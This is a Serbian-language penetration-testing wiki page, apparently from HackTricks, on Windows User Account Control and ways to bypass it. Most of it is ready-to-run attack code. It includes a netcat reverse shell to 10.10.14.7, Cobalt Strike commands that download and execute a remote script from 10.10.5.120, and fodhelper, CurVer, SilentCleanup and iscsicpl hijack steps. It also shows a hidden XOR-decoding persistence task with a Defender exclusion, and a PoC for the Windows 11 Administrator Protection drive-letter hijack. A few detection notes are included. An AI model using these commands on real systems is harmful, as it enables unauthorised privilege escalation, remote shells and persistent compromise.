# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **zahtev za potvrdu za aktivnosti koje zahtevaju povišene privilegije**. Aplikacije imaju različite nivoe `integrity`, a program sa **visokim nivoom** može da izvršava zadatke koji bi **potencijalno mogli da ugroze sistem**. Kada je UAC omogućen, aplikacije i zadaci se uvek **izvršavaju u bezbednosnom kontekstu naloga koji nije administrator** osim ako administrator izričito ne odobri da ove aplikacije/zadaci imaju pristup sistemu na nivou administratora radi izvršavanja. To je funkcija praktičnosti koja štiti administratore od nenamernih izmena, ali se ne smatra bezbednosnom granicom.<sup>[[2]](#references)</sup>

Više informacija o nivoima integriteta:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Kada je UAC aktivan, korisnik administrator dobija 2 tokena: token standardnog korisnika, za obavljanje uobičajenih radnji uz srednji nivo integriteta, i jedan sa administratorskim privilegijama.

Ova [stranica](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) detaljno objašnjava kako UAC funkcioniše i obuhvata proces prijavljivanja, korisničko iskustvo i UAC arhitekturu.<sup>[[2]](#references)</sup> Administratori mogu da koriste bezbednosne politike za konfigurisanje načina rada UAC-a u skladu sa potrebama svoje organizacije na lokalnom nivou (pomoću secpol.msc), ili da ga konfigurišu i distribuiraju putem Group Policy Objects (GPO) u Active Directory domenskom okruženju. Različite postavke su detaljno opisane [ovde](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Za UAC je moguće podesiti 10 Group Policy postavki. Sledeća tabela pruža dodatne detalje:

| Group Policy postavka                                                                                                                                                                                                                                                                                                                                                           | Registry ključ                | Podrazumevana postavka                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Režim administratorskog odobrenja za ugrađeni Administrator nalog](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Onemogućeno)                                             |
| [User Account Control: Ponašanje zahteva za povišene privilegije za administratore u režimu administratorskog odobrenja](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Zahtev za potvrdu za ne-Windows binarne datoteke na bezbednoj radnoj površini) |
| [User Account Control: Ponašanje zahteva za povišene privilegije za standardne korisnike](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Zahtev za akreditive na bezbednoj radnoj površini)         |
| [User Account Control: Otkrivanje instalacija aplikacija i zahtev za povišene privilegije](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Omogućeno; podrazumevano onemogućeno u izdanju Enterprise)           |
| [User Account Control: Povišavanje privilegija samo za izvršne datoteke koje su potpisane i validirane](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Onemogućeno)                                             |
| [User Account Control: Povišavanje privilegija samo za UIAccess aplikacije instalirane na bezbednim lokacijama](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Omogućeno)                                              |
| [User Account Control: Pokretanje svih administratora u režimu administratorskog odobrenja](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Omogućeno)                                              |
| [User Account Control: Dozvoljavanje UIAccess aplikacijama da zahtevaju povišene privilegije bez korišćenja bezbedne radne površine](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Onemogućeno)                                             |
| [User Account Control: Prebacivanje na bezbednu radnu površinu prilikom zahteva za povišene privilegije](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Omogućeno)                                              |
| [User Account Control: Virtuelizacija neuspešnih upisa u datoteke i Registry na lokacije po korisniku](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Omogućeno)                                              |

### Politike za instaliranje softvera na Windows-u

**Lokalne bezbednosne politike** ("secpol.msc" na većini sistema) podrazumevano su konfigurisane tako da **sprečavaju korisnike koji nisu administratori da instaliraju softver**. To znači da, čak i ako korisnik koji nije administrator može da preuzme instalacioni program za vaš softver, neće moći da ga pokrene bez administratorskog naloga.

### Registry ključevi za prisiljavanje UAC-a da zahteva povišene privilegije

Kao standardni korisnik bez administratorskih prava, možete da obezbedite da se od „standardnog“ naloga **zahtevaju akreditivi putem UAC-a** kada pokuša da izvrši određene radnje. Za ovu radnju je potrebno izmeniti određene **Registry ključeve**, za šta su vam potrebne administratorske dozvole, osim ako postoji **UAC bypass** ili je napadač već prijavljen kao administrator.

Čak i ako se korisnik nalazi u grupi **Administrators**, ove izmene primoravaju korisnika da **ponovo unese akreditive svog naloga** kako bi izvršio administratorske radnje.

**U praksi je ovo korisno samo ako već imate povišeni token, UAC bypass ili pogrešnu konfiguraciju koja vam omogućava da menjate ove ključeve; u suprotnom je sam upis u Registry blokiran.**

Registry ključevi i unosi koje morate da promenite su sledeći (sa podrazumevanim vrednostima u zagradama):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Ovo se može uraditi i ručno pomoću alata Local Security Policy. Nakon izmene, administratorske operacije zahtevaju od korisnika da ponovo unese svoje akreditive.

### Napomena

**User Account Control nije bezbednosna granica.** Zato standardni korisnici ne mogu da izađu iz svojih naloga i steknu administratorska prava bez lokalnog exploita za eskalaciju privilegija.

### Zatražite od korisnika „potpuni pristup računaru“
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC privilegije

- Internet Explorer Protected Mode koristi provere integriteta kako bi sprečio procese sa visokim nivoom integriteta (kao što su web pregledači) da pristupaju podacima sa niskim nivoom integriteta (kao što je fascikla privremenih Internet datoteka). To se postiže pokretanjem pregledača sa tokenom niskog nivoa integriteta. Kada pregledač pokuša da pristupi podacima smeštenim u zoni niskog integriteta, operativni sistem proverava nivo integriteta procesa i u skladu s tim dozvoljava pristup. Ova funkcija pomaže u sprečavanju napada daljinskog izvršavanja koda da dobiju pristup osetljivim podacima na sistemu.
- Kada se korisnik prijavi u Windows, sistem kreira access token koji sadrži listu korisnikovih privilegija. Privilegije su definisane kao kombinacija korisnikovih prava i mogućnosti. Token takođe sadrži listu korisnikovih kredencijala, odnosno kredencijale koji se koriste za autentifikaciju korisnika na računaru i pristup resursima na mreži.

### Autoadminlogon

Da biste konfigurisali Windows tako da pri pokretanju automatski prijavi određenog korisnika, podesite **`AutoAdminLogon` registry key**. Ovo je korisno u kiosk okruženjima ili u svrhe testiranja. Koristite ovo samo na bezbednim sistemima, jer lozinku izlaže u registru.

Podesite sledeće ključeve pomoću Registry Editora ili komande `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Da biste vratili uobičajeno ponašanje pri prijavljivanju, podesite `AutoAdminLogon` na 0.

## UAC bypass

> [!TIP]
> Imajte na umu da je UAC bypass jednostavan ako imate grafički pristup žrtvi, jer jednostavno možete kliknuti na „Yes“ kada se pojavi UAC upit.

UAC bypass je potreban u sledećoj situaciji: **UAC je aktiviran, vaš proces radi u kontekstu srednjeg nivoa integriteta, a vaš korisnik pripada administratorskoj grupi**.

Važno je napomenuti da je **mnogo teže zaobići UAC ako je podešen na najviši nivo bezbednosti (Always), nego ako je podešen na neki od drugih nivoa (Default).**

### Brza trijaža iz shell-a srednjeg nivoa integriteta

Pre nego što pokušate bypass, potvrdite da se nalazite u odgovarajućoj situaciji i mapirajte build hosta na poznate metode koje funkcionišu:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Praktične napomene:
- Ako je `EnableLUA=0`, nije vam potreban bypass: bilo koji administratorski token može direktno da zatraži visok nivo integriteta.
- `ConsentPromptBehaviorAdmin=2` ili `5` je uobičajen scenario za auto-elevate / COM-based bypasses.
- `Always Notify` podiže nivo zaštite, ali ipak treba testirati konkretnu build verziju umesto pretpostavke da neće uspeti: UACME i dalje prati neke metode kompatibilne sa `AlwaysNotify` na modernim Windows build verzijama.<sup>[[3]](#references)</sup>

### UAC onemogućen

Ako je UAC već onemogućen (`ConsentPromptBehaviorAdmin` je **`0`**), možete **izvršiti reverse shell sa administratorskim privilegijama** (nivo visokog integriteta) koristeći nešto poput:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass sa dupliciranjem tokena

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Veoma** osnovni UAC „bypass“ (potpun pristup sistemu datoteka)

Ako imate shell sa korisnikom koji se nalazi u grupi Administrators, možete **montirati C$** deljen putem SMB-a (sistem datoteka) lokalno na novi disk i imaćete **pristup svemu unutar sistema datoteka** (čak i matičnoj fascikli Administratora).

> [!WARNING]
> **Izgleda da ovaj trik više ne funkcioniše**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass pomoću Cobalt Strike-a

Cobalt Strike tehnike će raditi samo ako UAC nije podešen na maksimalni nivo bezbednosti
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** i **Metasploit** takođe imaju nekoliko modula za **bypass** **UAC-a**.

### Elevated COM interfejsi (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM objekti i dalje predstavljaju praktičnu UAC površinu na modernim buildovima. UACME i dalje beleži `ICMLuaUtil` kao funkcionalan na aktuelnim Windows granama, a offensive alati nastavljaju da prilagođavaju `CMSTPLUA` kombinovanjem procesa na interaktivnoj radnoj površini, 64-bitnog izvršavanja i, ponekad, PEB/process masquerading-a pre pozivanja COM Elevation Moniker-a.<sup>[[3]](#references)</sup>

Praktični saveti:
- Dajte prednost **64-bitnom** procesu u korisnikovoj **interaktivnoj sesiji** (najčešće `explorer.exe` ili njegovom child procesu).
- Ako raw shell ne uspe, pokušajte ponovo iz BOF / UACME implementacije umesto naivnog `CreateProcess` wrapper-a.
- Očekujte da će se child izvršavanje odvijati u **zasebnom procesu sa povišenim privilegijama**; mnogi BOF-ovi ne eleviraju trenutni beacon in-place.

### KRBUACBypass

Dokumentacija i alat nalaze se na [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) je kolekcija UAC bypass tehnika. Kompajlirajte ga pomoću Visual Studio-a ili MSBuild-a; build kreira nekoliko izvršnih datoteka (na primer, `Source\Akagi\output\x64\Debug\Akagi.exe`), zato izaberite metod koji odgovara ciljnom buildu.<sup>[[3]](#references)</sup>\
Budite oprezni: neki bypass-i pokreću vidljive programe ili promptove koji mogu upozoriti korisnika.<sup>[[3]](#references)</sup>

UACME sadrži **build verziju od koje je svaka tehnika počela da radi**.<sup>[[3]](#references)</sup> Možete pretražiti tehniku koja utiče na vaše verzije:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Takođe, pomoću [ove](https://en.wikipedia.org/wiki/Windows_10_version_history) stranice dobijate Windows izdanje `1607` na osnovu build verzija.

Praktičan postupak je da prvo **procenite build hosta**, a tek onda pokrenete odgovarajući metod:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` brzo upoređuje lokalni build sa poznatim UAC metodama, što je korisno za brzo odbacivanje nevažećih PoC-ova.<sup>[[4]](#references)</sup>
- `UACME` i dalje predstavlja najbolji javni katalog za povezivanje bypass-a sa preciznim build-om. Nedavna izdanja su dodala nove metode i ponovo testirala postojeće metode na **Windows 11 25H2**, zato ponovo proverite README/beleške o izdanju pre nego što pretpostavite da se stari blog post i dalje nepromenjeno primenjuje.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Pouzdani binarni fajl `fodhelper.exe` je na modernom Windows-u automatski eleviran. Prilikom pokretanja, on upituje donju registry putanju po korisniku bez validacije glagola `DelegateExecute`. Postavljanjem komande na toj lokaciji, proces sa Medium Integrity nivoom (korisnik je član grupe Administrators) može da pokrene proces sa High Integrity nivoom bez UAC upita.

Registry putanja koju `fodhelper` upituje:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell koraci (postavite payload, zatim ga aktivirajte)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Napomene:
- Funkcioniše kada je trenutni korisnik član grupe Administrators, a UAC nivo podrazumevan/blag (ne Always Notify sa dodatnim ograničenjima).
- Koristite putanju `sysnative` da pokrenete 64-bitni PowerShell iz 32-bitnog procesa na 64-bitnom Windowsu.
- Payload može biti bilo koja komanda (PowerShell, cmd ili putanja do EXE datoteke). Za stealth izbegavajte UI prozore koji zahtevaju potvrdu.

#### CurVer/extension hijack varijanta (samo HKCU)

Nedavni uzorci koji zloupotrebljavaju `fodhelper.exe` izbegavaju `DelegateExecute` i umesto toga **preusmeravaju `ms-settings` ProgID** putem vrednosti `CurVer` za trenutnog korisnika. Binarna datoteka koja se automatski elevira i dalje razrešava handler u okviru `HKCU`, tako da za postavljanje ključeva nije potreban admin token:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Nakon eskalacije privilegija, malver obično **onemogućava buduće upite** postavljanjem vrednosti `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` na `0`, a zatim sprovodi dodatno izbegavanje odbrambenih mehanizama (npr. `Add-MpPreference -ExclusionPath C:\ProgramData`) i ponovo kreira persistence kako bi se izvršavao sa visokim integritetom. Tipičan persistence task čuva **XOR-enkriptovanu PowerShell skriptu** na disku i dekodira/izvršava je u memoriji svakog sata:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Ova varijanta i dalje uklanja dropper i ostavlja samo staged payloads, pa se detekcija oslanja na nadgledanje **`CurVer` hijack-a**, izmene vrednosti `ConsentPromptBehaviorAdmin`, kreiranje Defender exclusion-a ili scheduled tasks koji u memoriji dešifruju PowerShell.<sup>[[5]](#references)</sup>

### UAC bypass putem `SilentCleanup` task-a (`HKCU\Environment\windir`)

`SilentCleanup` pokreće `cleanmgr.exe` sa najvišim privilegijama i proširuje `%windir%` iz korisničkog okruženja. Ako kontrolišete `HKCU\Environment\windir`, možete preusmeriti to proširivanje na proizvoljnu komandu i dobiti high integrity bez dijaloga za saglasnost.<sup>[[8]](#references)</sup> Ovaj metod i dalje vredi testirati na novijim build-ovima, jer UACME održava tehniku aktivnom, a praćenje nedavnih problema pokazuje da Windows 11 24H2 možda zahteva samo male izmene navodnika.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Ako zadatak navodi putanju na toj verziji, ponovite pokušaj sa payloadom koji se završava navodnikom (na primer `cmd.exe"`). Uvek obrišite `HKCU\Environment\windir` nakon testiranja.

#### Još UAC bypass tehnika

Mnoge klasične UAC bypass tehnike koje zloupotrebljavaju UI tokove, COM objekte ili interakciju sa desktopom zahtevaju **potpunu interaktivnu sesiju** sa žrtvom; uobičajeni `nc.exe` shell ili servis koji radi u **Session 0** često nisu dovoljni.

To često možete rešiti pomoću **meterpreter** sesije. Migrirajte u **proces** čija je vrednost **Session** jednaka **1**:

![Usmerite ms-settings na prilagođenu ekstenziju (.thm) i mapirajte tu ekstenziju na naš payload - Još UAC bypass tehnika: Ovo možete dobiti pomoću meterpreter sesije. Migrirajte u proces čija je vrednost Session...](<../../images/image (863).png>)

(_explorer.exe_ bi trebalo da radi)

### UAC Bypass pomoću GUI-ja

Ako imate pristup **GUI-ju, možete jednostavno prihvatiti UAC prompt** kada se pojavi; tehnički bypass vam zapravo nije potreban. Zato je dobijanje GUI sesije često dovoljno da se zaobiđe praktično otežanje koje dodaje UAC.

Pored toga, ako dobijete GUI sesiju koju je neko koristio (potencijalno putem RDP-a), **neki alati će raditi kao administrator**, pa odatle možete **pokrenuti**, na primer, **cmd** direktno **kao admin**, bez ponovnog UAC prompta, kao što je [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Ovo može biti malo **stealthy**.

### Bučni brute-force UAC bypass

Ako je buka prihvatljiva, alat kao što je [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) može iznova zahtevati elevaciju sve dok je korisnik ne prihvati.

### Vaš sopstveni bypass - Osnovna metodologija za UAC bypass

Ako pogledate **UACME**, primetićete da **mnoge UAC bypass tehnike zloupotrebljavaju DLL hijacking** (često tako što elevated binary učitava DLL pod kontrolom napadača iz putanje u koju je moguće upisivati). [Pročitajte ovo da biste naučili kako da pronađete ranjivost za DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Pronađite binary koji će se **autoelevate** (proverite da se pri izvršavanju pokreće sa visokim nivoom integriteta).
2. Pomoću procmon-a pronađite događaje "**NAME NOT FOUND**" koji mogu biti ranjivi na **DLL Hijacking**.
3. Verovatno ćete morati da **upišete** DLL unutar nekih **zaštićenih putanja** (kao što je C:\Windows\System32), u koje nemate dozvole za upisivanje. Ovo možete zaobići pomoću:
1. **wusa.exe**: Windows 7, 8 i 8.1. Omogućava ekstrakciju sadržaja CAB datoteke unutar zaštićenih putanja (zato što se ovaj alat izvršava sa visokog nivoa integriteta).
2. **IFileOperation**: Windows 10.
4. Pripremite **skriptu** za kopiranje vašeg DLL-a u zaštićenu putanju i izvršavanje ranjivog i autoelevated binary-ja.

### Druga UAC bypass tehnika

Sastoji se u praćenju da li **autoElevated binary** pokušava da iz **registry-ja** **pročita** **ime/putanju** **binary-ja** ili **komande** koju treba **izvršiti** (ovo je interesantnije ako binary ove informacije traži unutar **HKCU**).

### UAC bypass putem `SysWOW64\iscsicpl.exe` + DLL hijack-a korisničkog `PATH`-a

32-bitni `C:\Windows\SysWOW64\iscsicpl.exe` je **auto-elevated** binary koji može biti zloupotrebljen za učitavanje `iscsiexe.dll` prema redosledu pretrage. Ako možete postaviti maliciozni `iscsiexe.dll` u folder u koji **korisnik može da upisuje**, a zatim izmeniti `PATH` trenutnog korisnika (na primer putem `HKCU\Environment\Path`) tako da se taj folder pretražuje, Windows može učitati DLL napadača unutar elevated `iscsicpl.exe` procesa **bez prikazivanja UAC prompta**.<sup>[[1]](#references)[[6]](#references)</sup>

Praktične napomene:
- Ovo je korisno kada je trenutni korisnik u grupi **Administrators**, ali radi na nivou **Medium Integrity** zbog UAC-a.
- Kopija u **SysWOW64** je relevantna za ovaj bypass. Kopiju u **System32** tretirajte kao zaseban binary i nezavisno proverite ponašanje.
- Primitiv predstavlja kombinaciju **auto-elevacije** i **DLL search-order hijacking-a**, pa je isti ProcMon workflow koji se koristi za druge UAC bypass tehnike koristan za potvrdu učitavanja DLL-a koji nedostaje.

Minimalni tok:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Ideje za detekciju:
- Upozoriti na `reg add` / upisivanje u registry ključ `HKCU\Environment\Path` neposredno praćeno izvršavanjem `C:\Windows\SysWOW64\iscsicpl.exe`.
- Tražiti `iscsiexe.dll` na lokacijama koje kontroliše **user**, kao što su `%TEMP%` ili `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Korelisati pokretanje `iscsicpl.exe` sa neočekivanim child procesima ili učitavanjem DLL-ova izvan uobičajenih Windows direktorijuma.

### Novija istraživanja koja vredi proveriti zasebno

Neki chain-ovi nakon 2024. više ne izgledaju kao klasični `HKCU\Software\Classes` registry hijack-ovi. Na primer, activation-context cache poisoning može kombinovati **drive remap** i **DLL redirection** kako bi se prešlo sa medium na high integrity kroz trusted UI / auto-elevated binarne datoteke, kao što su `ctfmon.exe`, a zatim i noviji target-i poput `fodhelper.exe`. Umesto dupliciranja velikog PoC-a ovde, proverite kompaktne primere payload-a u:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (25H2) drive-letter hijack preko DOS device mape po logon sesiji

Za kompletnu attack surface oblast `RAiLaunchAdminProcess` / UIAccess na Windows 11 25H2, pogledajte posebnu stranicu:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 „Administrator Protection“ koristi shadow-admin tokene sa mapama `\Sessions\0\DosDevices/<LUID>` po sesiji. Direktorijum se kreira lazy putem `SeGetTokenDeviceMap` pri prvom `\??` razrešavanju. Ako attacker impersonate-uje shadow-admin token samo na nivou **SecurityIdentification**, direktorijum se kreira tako da je attacker **owner** (nasleđuje `CREATOR OWNER`), čime se omogućavaju drive-letter linkovi koji imaju prednost nad `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Koraci:**

1. Iz low-privileged sesije pozvati `RAiProcessRunOnce` kako bi se pokrenuo promptless shadow-admin `runonce.exe`.
2. Duplirati njegov primary token u **identification** token i impersonate-ovati ga prilikom otvaranja `\??`, kako bi se pod attacker ownership-om prinudno kreiralo `\Sessions\0\DosDevices/<LUID>`.
3. Tamo kreirati `C:` symlink koji pokazuje na storage pod kontrolom attackera; naredni filesystem pristupi u toj sesiji razrešavaće `C:` na attacker path, čime se omogućava DLL/file hijack bez prompta.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Kako funkcioniše User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Kolekcija UAC bypass tehnika](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Skener kompatibilnosti i launcher za UAC bypass](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI koristi AI za generisanje PowerShell backdoor-a](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operacija TrueChaos: 0-Day eksploatacija protiv ciljeva vlada jugoistočne Azije](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Zaobilaženje Windows Administrator Protection zaštite](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – UAC bypass pomoću SilentCleanup task-a](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
{{#include ../../banners/hacktricks-training.md}}
